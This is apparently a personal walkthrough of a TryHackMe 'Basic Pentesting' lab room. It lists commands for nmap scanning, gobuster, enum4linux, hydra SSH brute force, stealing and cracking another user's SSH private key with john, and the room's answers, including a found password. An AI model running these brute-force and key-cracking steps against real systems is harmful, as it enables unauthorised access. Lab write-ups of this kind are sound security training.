# Basic Pentesting

Link : [https://tryhackme.com/room/basicpentestingjt](https://tryhackme.com/room/basicpentestingjt)

[https://tryhackme.com/room/basicpentestingjt](https://tryhackme.com/room/basicpentestingjt)

<aside>
ðŸ’¡ [josiah@vt.edu](mailto:josiah@vt.edu)

</aside>

---

### FlowChart

- Nmap â†’ Port Scanning, services
- Gobuster â†’ Directories
- Enum4Linux â†’ Usernames
- Hydra â†’ Passwords

```mermaid
graph TD
  Start --> Port_Scanning -- Nmap --> Directory -- Gobuster -->  Username -- enum4linux --> Password -- Hydra --> Exit
```

---

1. After deploying Machine, run in the VM
    
    ```bash
    	sudo openvpn /Downloads/omnipresent.1802.ovpn
    ```
    
2. Services
    
    ```bash
    nmap IP 
    ```
    
    ```bash
    nmap -sC -sV -oN IP *filename* -v
    ```
    
3. For checking  the url weâ€™ll need **gobuster tool** 
    
    ```bash
    gobuster dir -u URL -w /*file_path*/common.txt
    ```
    
    ```bash
    gobuster dir -u URL -w /usr/share/wordlists/dirb/common.txt
    ```
    
4. For brute-forcing the username weâ€™ll use **enum4linux**
    
    ```bash
    enum4linux -a IP | tee enum4linux.log 
    ```
    
    ```bash
    enum4linux -a IP
    ```
    
5. For brute-forcing the password weâ€™ll need **hydra tool**
    
    ```bash
    hydra -l USER -P *pathToWordlists*/rockyou.txt ssh://IP
    ```
    
    ```bash
    hydra -l USER -P *pathToWordlists*/rockyou.txt IP ssh
    ```
    
    will need *rockyou.txt* 
    
6. Now login into system using ssh and the above received username and password
    
    ```bash
    ssh USER@IP
    ```
    

### For priviledge escalation

<aside>
ðŸ’¡ Login using USER and search for accessible files

</aside>

<aside>
ðŸ’¡ `/home/kay`

</aside>

1. To check the accessible files for current USER
    
    ```bash
    ls -la
    ```
    
2. Go to /.ssh/
    
    ```bash
    cd .ssh/
    ls
    cat id_rsa
    ```
    
3. Go to downloads and create new files
    
    ```bash
    touch id_rsa
    gedit id_rsa
    ```
    
    Paste the contents
    
4. Convert the Private Key to Hash using python
    
    ```bash
    python /usr/share/john/ssh2john.py Downloads/id_rsa > id_hash
    ```
    
    Check 
    
    ```bash
    cat Downloads/id_hash
    mv id_hash Downloads/id_hash
    ```
    
5. Now we can decode to get the password
    
    ```bash
    sudo john --wordlist=Documents/rockyou.txt Downloads/id_hash
    ```
    
6. Now login using other user
    
    ```bash
    chmod 600 id_rsa
    ```
    
    ```bash
    ssh -i id_rsa USER2@IP
    ```
    
7. Now for the flag
    
    ```bash
    cat pass.bak
    sudo cd /root/
    ```
    
    ---
    
    ## Questions and Answers
    
    ### Directories Found
    
     `/development` development found via **gobuster**
    
    ### Usernames found
    
    `jan`  and `kay`  found via **enum4linux**
    
    ### Passwords Found
    
    `jay:armando` found using **hydra**